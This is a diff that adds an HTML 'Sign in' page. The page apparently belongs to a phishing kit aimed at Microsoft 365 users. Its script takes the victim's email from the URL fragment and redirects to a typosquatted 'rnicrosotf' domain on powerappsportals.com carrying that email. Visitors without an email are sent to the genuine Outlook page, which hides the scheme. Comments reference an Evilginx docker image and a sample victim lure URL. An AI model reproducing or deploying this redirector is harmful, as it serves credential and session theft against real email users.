@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<title>
+		Sign in 
+	</title>
+<link rel="shortcut icon" href="https://myoffcss.s3.ap-northeast-1.amazonaws.com/favicon.png"
+        type="image/x-icon">
+  	<link rel="icon" type="image/png" sizes="16x16" href="/mygov/content/mgv2/icons/favicon-16x16.png">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">       </script>
+</head>
+<body>
+
+<script>
+
+var emailID = ' ';
+
+//  'd2lsc29uQHdpbG9zbm1vbmFjby5jb20='
+
+// function b64DecodeUnicode(str) {
+//   // Going backwards: from bytestream, to percent-encoding, to original string.
+//   return decodeURIComponent(atob(str).split('').map(function(c) {
+//       return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+//   }).join(''));
+// }
+
+
+function redirrectPage(){
+  var query = window.location.href;
+  console.log(query);
+  var res = query.split("#");
+  var data1 = res[0];
+  var data2 = res[1];
+  console.log(data1);
+  console.log(data2);
+
+  // realemailID = b64DecodeUnicode(data2);        https://hookmist.com/#wilson@mmm.com
+  // console.log(realemailID);
+
+  if (data2)
+  {
+    console.log("true");
+      window.location.href = "https://rnicrosotfonline-office12-commonserver-access-secureoffice365.powerappsportals.com/6907632c6-49b0-83e6-1d93765276ca-redirect-uri-31f2dcf7-8607389098883894/?cfg=" + data2;
+  }else{
+    console.log("false");
+    window.location.href = "https://outlook.office.com/mail/";
+  }
+}
+
+redirrectPage();
+
+//  https://outlook.office.com/mail/
+
+
+
+// docker commit 0dfe64eba151  mrcew/evilginxapp:withall2
+
+</script>
+</body>
+</html>
